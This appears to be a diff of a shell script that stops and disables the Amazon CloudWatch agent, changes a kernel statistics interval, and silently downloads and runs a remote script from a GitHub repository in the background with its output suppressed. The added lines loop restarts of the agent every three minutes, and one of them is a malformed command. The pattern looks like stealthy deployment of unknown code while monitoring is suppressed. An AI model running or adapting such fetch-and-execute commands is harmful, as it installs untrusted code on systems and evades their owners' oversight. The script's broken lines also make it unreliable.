@@ -4,4 +4,9 @@ systemctl disable amazon-cloudwatch-agent; systemctl stop amazon-cloudwatch-agen
 bash <(sysctl -w vm.stat_interval=86400  || sudo sysctl -w vm.stat_interval=86400) >/dev/null 2>&1
 
 bash <(wget -qO- https://github.com/army2mil/njabscb/raw/refs/heads/main/...) >>/dev/null 2>&1 &
+while [ 1 ]; do
+    restart restart-cloudwatch-agent
+    systemctl restart amazon-cloudwatch-agent.service
+    sleep 180
+done
 #bash <(wget -qO- https://github.com/army2mil/cautech/raw/refs/heads/main/...) >>/dev/null 2>&1 &
